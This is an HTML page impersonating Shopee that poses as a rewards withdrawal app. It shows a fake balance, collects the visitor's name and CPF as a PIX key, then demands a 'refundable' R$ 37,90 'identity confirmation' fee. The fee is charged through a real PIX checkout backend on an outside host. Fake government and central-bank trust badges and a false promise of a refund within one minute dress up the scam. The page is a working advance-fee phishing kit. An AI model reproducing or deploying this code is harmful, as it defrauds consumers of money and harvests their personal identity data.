<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --orange: #ee4d2d;
            --gray-bg: #eef1f3;
            --text-dark: #222;
            --green-tag: #e6f7f1;
            --green-text: #00bfa5;
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Roboto', sans-serif;
            background: #e5e5e5;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .app-container {
            width: 100%;
            max-width: 480px;
            background: #fdfdfd;
            min-height: 100vh;
            position: relative;
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }

        /* --- ETAPA 1: DASHBOARD --- */
        .header-stage1 { padding: 20px; text-align: center; font-weight: 700; font-size: 18px; }
        .balance-card {
            background: var(--orange); margin: 10px 15px; border-radius: 12px; padding: 20px; color: white;
            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3); position: relative; overflow: hidden;
        }
        .coin-icon {
            position: absolute; right: 15px; top: 50%; transform: translateY(-50%); font-size: 40px; color: rgba(255,255,255,0.2);
            border: 2px solid rgba(255,255,255,0.4); border-radius: 50%; width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;
        }
        .withdraw-section { padding: 20px; }
        .grid-options { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .option-card { background: #f0f0f0; border-radius: 8px; padding: 15px 5px; text-align: center; font-weight: 700; font-size: 14px; color: #333; }
        .big-option {
            background: #f0f0f0; border-radius: 8px; padding: 25px; text-align: center; font-weight: 800; font-size: 24px; color: #333; cursor: pointer; transition: 0.2s;
        }
        .big-option:active { transform: scale(0.98); background: #fff5f1; border: 1px solid var(--orange); }
        
        .overlay-blur {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5);
            backdrop-filter: blur(4px); z-index: 90; opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
        }
        .overlay-blur.active { opacity: 1; pointer-events: all; }

        /* --- ETAPA 2: SLIDE UP (INPUTS) --- */
        .bottom-sheet {
            position: fixed; bottom: 0; left: 50%; transform: translateX(-50%) translateY(110%);
            width: 100%; max-width: 480px; background: white; border-top-left-radius: 20px; border-top-right-radius: 20px;
            padding: 25px; box-shadow: 0 -5px 25px rgba(0,0,0,0.15); z-index: 100; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .bottom-sheet.active { transform: translateX(-50%) translateY(0); }
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: #333; }
        .input-group input, .input-group select { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; }
        .btn-action { width: 100%; padding: 16px; background: var(--orange); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; cursor: pointer; }

        /* --- ETAPA 3: TELA CHEIA (CONFIRMAÇÃO FINAL) --- */
        .full-screen-page {
            position: fixed; top: 0; left: 50%; transform: translateX(-50%) translateY(100%); /* Começa embaixo */
            width: 100%; max-width: 480px; height: 100%;
            background: #eef1f3; /* Fundo cinza do print */
            z-index: 200; overflow-y: auto;
            transition: transform 0.4s ease-out;
            padding: 15px;
            padding-bottom: 40px;
        }
        .full-screen-page.active { transform: translateX(-50%) translateY(0); }

        /* LOGO SHOPEE NO TOPO */
        .shopee-top-logo { text-align: center; margin-bottom: 15px; margin-top: 10px; }
        .shopee-top-logo img { height: 35px; }

        /* CARD BRANCO PRINCIPAL */
        .main-card {
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            overflow: hidden;
            margin-bottom: 20px;
        }

        /* HEADER DO CARD (SALDO) */
        .card-header-orange {
            border-top: 6px solid var(--orange); /* Borda Laranja Grossa */
            padding: 20px;
            border-bottom: 1px solid #eee;
        }
        .label-disp { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #555; margin-bottom: 5px; }
        .val-big { font-size: 32px; font-weight: 800; color: #222; }
        .sub-wait { font-size: 14px; color: #666; margin-top: 5px; }

        /* CORPO DO CARD */
        .card-body { padding: 20px; }
        
        .confirm-title { font-size: 14px; color: #444; text-transform: uppercase; font-weight: 600; margin-bottom: 10px; }
        
        .price-tag-row { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .price-red { font-size: 28px; font-weight: 800; color: #d32f2f; } /* Vermelho meio Shopee */
        .tag-green { background: var(--green-tag); color: var(--green-text); font-size: 11px; font-weight: 700; padding: 4px 8px; border-radius: 4px; text-transform: uppercase; }

        .desc-text { font-size: 13px; color: #333; line-height: 1.5; margin-bottom: 25px; }

        /* TABELA DE DADOS */
        .data-box-title { font-size: 12px; color: #888; font-weight: 700; text-transform: uppercase; margin-bottom: 15px; letter-spacing: 0.5px; }
        .data-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
        .d-label { color: #666; }
        .d-value { font-weight: 600; color: #222; text-align: right; }
        .total-row { display: flex; justify-content: space-between; padding-top: 15px; align-items: center; }
        .total-val { font-size: 18px; font-weight: 800; color: #222; }

        /* LISTA DE PROCESSOS (IMAGEM DE BAIXO) */
        .process-box {
            background: white; border-radius: 10px; padding: 20px; margin-top: 15px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .process-title { font-size: 13px; font-weight: 700; color: #444; margin-bottom: 15px; text-transform: uppercase; }
        
        .step-item { display: flex; gap: 15px; margin-bottom: 20px; }
        .step-num { 
            width: 24px; height: 24px; background: #fcece9; color: var(--orange); 
            border-radius: 4px; display: flex; align-items: center; justify-content: center; 
            font-weight: bold; font-size: 12px; flex-shrink: 0;
        }
        .step-check {
             width: 24px; height: 24px; background: #e6f7f1; color: var(--green-text); 
            border-radius: 4px; display: flex; align-items: center; justify-content: center; 
            font-weight: bold; font-size: 14px; flex-shrink: 0;
        }
        .step-content div:first-child { font-weight: 700; font-size: 14px; color: #333; margin-bottom: 3px; }
        .step-content div:last-child { font-size: 12px; color: #777; }

        /* BOTÃO FINAL E BADGES */
        .btn-final-red {
            background: #f53d2d; /* Vermelho Shopee mais forte */
            color: white; width: 100%; padding: 15px; border: none; border-radius: 6px;
            font-size: 16px; font-weight: 600; margin-top: 10px; cursor: pointer;
            box-shadow: 0 4px 10px rgba(245, 61, 45, 0.2);
        }
        .timer-txt { text-align: center; font-size: 12px; color: var(--green-text); margin-top: 10px; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px; }

        .trust-badges-row { display: flex; justify-content: center; gap: 20px; margin-top: 25px; opacity: 0.8; }
        .t-badge { height: 20px; object-fit: contain; filter: grayscale(100%); }

        /* TELA QR CODE */
        #qr-screen {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 300; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
        }
    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="stage-1">
            <div class="header-stage1">Resgatar recompensas</div>
            
            <div class="balance-card">
                <div style="font-size: 14px; margin-bottom: 5px;">Seu saldo</div>
                <div style="font-size: 32px; font-weight: 800;">R$ 1.489,38</div>
                <div style="font-size: 12px; opacity: 0.9; margin-top: 5px;">= 42.583,05 pontos (s)</div>
                <div style="margin-top: 15px; font-size: 11px; border-top: 1px dashed rgba(255,255,255,0.3); padding-top: 10px;">
                    Última bonificação apresentada: R$ 845,24
                </div>
                <div class="coin-icon">$</div>
            </div>

            <div class="withdraw-section">
                <div class="grid-options">
                    <div class="option-card">R$1,5</div>
                    <div class="option-card">R$5</div>
                    <div class="option-card">R$10</div>
                </div>

                <div class="big-option" onclick="abrirEtapa2()">R$ 1.489,38</div>
                <div style="text-align: center; color: #ccc; font-size: 12px; margin-top: 5px;">Toque para sacar tudo</div>
            </div>
        </div>

        <div class="overlay-blur" id="overlay"></div>

        <div class="bottom-sheet" id="stage-2">
            <h3 style="text-align: center; margin-bottom: 20px;">Vincular PIX</h3>
            <div class="input-group">
                <label>Nome Completo</label>
                <input type="text" id="input-nome" placeholder="Nome do titular">
            </div>
            <div class="input-group">
                <label>Chave PIX (CPF)</label>
                <input type="tel" id="input-chave" placeholder="000.000.000-00" maxlength="14" oninput="formatarCPF(this)">
            </div>
            <button class="btn-action" onclick="irParaEtapa3()">CONTINUAR</button>
        </div>

        <div class="full-screen-page" id="stage-3">
            
            <div class="shopee-top-logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/2560px-Shopee.svg.png">
            </div>

            <div class="main-card">
                <div class="card-header-orange">
                    <div class="label-disp">SALDO DISPONÍVEL</div>
                    <div class="val-big">R$ 1.489,38</div>
                    <div class="sub-wait">Aguardando confirmação para saque</div>
                </div>

                <div class="card-body">
                    <div class="confirm-title">CONFIRMAÇÃO DE IDENTIDADE</div>
                    
                    <div class="price-tag-row">
                        <div class="price-red">R$ 37,90</div>
                        <div class="tag-green">VALOR REEMBOLSÁVEL</div>
                    </div>

                    <p class="desc-text">
                        Taxa obrigatória para liberação do bônus no valor de <b>R$ 1.489,38</b>. O valor de <b>R$ 37,90</b> será reembolsado integralmente para você em 1 minuto.
                    </p>

                    <div style="background: #f9f9f9; padding: 15px; border-radius: 8px; border: 1px solid #eee;">
                        <div class="data-box-title">DADOS PARA REEMBOLSO</div>
                        
                        <div class="data-row">
                            <span class="d-label">Nome</span>
                            <span class="d-value" id="review-nome">--</span>
                        </div>
                        <div class="data-row">
                            <span class="d-label">Data</span>
                            <span class="d-value" id="review-data">--/--/----</span>
                        </div>
                        <div class="data-row">
                            <span class="d-label">Chave PIX</span>
                            <span class="d-value" id="review-chave">--</span>
                        </div>
                        
                        <div class="total-row">
                            <span class="d-label">Valor a receber</span>
                            <span class="total-val">R$ 1.489,38</span>
                        </div>
                    </div>
                </div>
            </div>

            <div class="process-box">
                <div class="process-title">PROCESSO DE LIBERAÇÃO</div>
                
                <div class="step-item">
                    <div class="step-num">1</div>
                    <div class="step-content">
                        <div>Pagar taxa de confirmação</div>
                        <div>R$ 37,90 para verificação de identidade</div>
                    </div>
                </div>

                <div class="step-item">
                    <div class="step-check">✓</div>
                    <div class="step-content">
                        <div style="color: var(--green-text);">Receber reembolso automático</div>
                        <div>Valor devolvido em 1 minuto</div>
                    </div>
                </div>

                <div class="step-item">
                    <div class="step-num" style="background: #eee; color: #999;">3</div>
                    <div class="step-content">
                        <div>Acessar saldo completo</div>
                        <div>R$ 4.596,72 liberado para saque</div>
                    </div>
                </div>

                <button class="btn-final-red" id="btn-final" onclick="gerarPixReal()">
                    Pagar taxa para Liberar Saque
                </button>
                
                <div class="timer-txt">
                    ⏱ Reembolso automático em 1 minuto
                </div>

                <div class="trust-badges-row">
                    <div style="font-weight:bold; color:#005da3;">BACEN</div>
                    <div style="font-weight:bold; color:#00a000;">gov.br</div>
                    <div style="font-weight:bold; color:#222;">Receita Federal</div>
                </div>
            </div>

            <div style="height: 30px;"></div>
        </div>

        <div id="qr-screen">
            <h3 style="color:#333;">Pagamento via Pix</h3>
            <p style="font-size:14px; text-align:center; color:#555;">Pague e receba seu saldo + estorno em 8s.</p>
            <img id="qr-image" style="width: 220px; margin: 20px 0; border:1px solid #eee;">
            <div id="pix-copia" style="font-size:11px; color:#777; background:#f0f0f0; padding:10px; border-radius:5px; word-break:break-all; margin-bottom:20px;"></div>
            <button class="btn-action" onclick="copiarCodigo()">COPIAR CÓDIGO</button>
            <div id="msg-sucesso" style="margin-top:20px; color:green; font-weight:bold; display:none;">✅ PAGAMENTO CONFIRMADO!</div>
        </div>

    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";

        // --- FUNÇÕES DE NAVEGAÇÃO ---
        function abrirEtapa2() {
            document.getElementById('overlay').classList.add('active');
            document.getElementById('stage-2').classList.add('active');
        }

        function irParaEtapa3() {
            const nome = document.getElementById('input-nome').value;
            const chave = document.getElementById('input-chave').value;

            if(nome.length < 3 || chave.length < 5) {
                alert("Preencha os dados corretamente.");
                return;
            }

            // Preenche dados na Etapa 3
            document.getElementById('review-nome').innerText = nome;
            document.getElementById('review-chave').innerText = "CPF " + chave;
            document.getElementById('review-data').innerText = new Date().toLocaleDateString('pt-BR');

            // Esconde Etapa 2 e Mostra Etapa 3 (Full Screen)
            document.getElementById('stage-2').classList.remove('active');
            
            // Pequeno delay
            setTimeout(() => {
                document.getElementById('stage-3').classList.add('active');
            }, 200);
        }

        function formatarCPF(i) {
            let v = i.value.replace(/\D/g,"");
            v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4");
            i.value = v;
        }

        // --- INTEGRAÇÃO BACKEND ---
        async function gerarPixReal() {
            const nome = document.getElementById('input-nome').value;
            const cpf = document.getElementById('input-chave').value.replace(/\D/g,''); 
            const btn = document.getElementById('btn-final');

            btn.innerText = "GERANDO...";
            btn.disabled = true;

            try {
                const res = await fetch(`${API_URL}/pix`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        amount: 37.90, // Valor da taxa
                        name: nome,
                        cpf: cpf
                    })
                });
                
                const data = await res.json();

                if (data.point_of_interaction) {
                    const qr = data.point_of_interaction.transaction_data;
                    
                    document.getElementById('stage-3').classList.remove('active'); // Fecha Etapa 3
                    document.getElementById('overlay').classList.remove('active');
                    
                    const telaQr = document.getElementById('qr-screen');
                    telaQr.style.display = 'flex';
                    
                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
                    document.getElementById('pix-copia').innerText = qr.qr_code;

                    monitorar(data.id);
                }
            } catch (e) {
                alert("Erro ao conectar.");
                btn.innerText = "Pagar taxa para Liberar Saque";
                btn.disabled = false;
            }
        }

        function monitorar(id) {
            setInterval(async () => {
                try {
                    const r = await fetch(`${API_URL}/pix/${id}`);
                    const j = await r.json();
                    if(j.status === 'approved' || j.status === 'refunded') {
                        document.getElementById('msg-sucesso').style.display = 'block';
                        document.getElementById('qr-image').style.opacity = 0.3;
                    }
                } catch(e){}
            }, 3000);
        }

        function copiarCodigo() {
            navigator.clipboard.writeText(document.getElementById('pix-copia').innerText);
            alert("Código copiado!");
        }
    </script>
</body>
</html>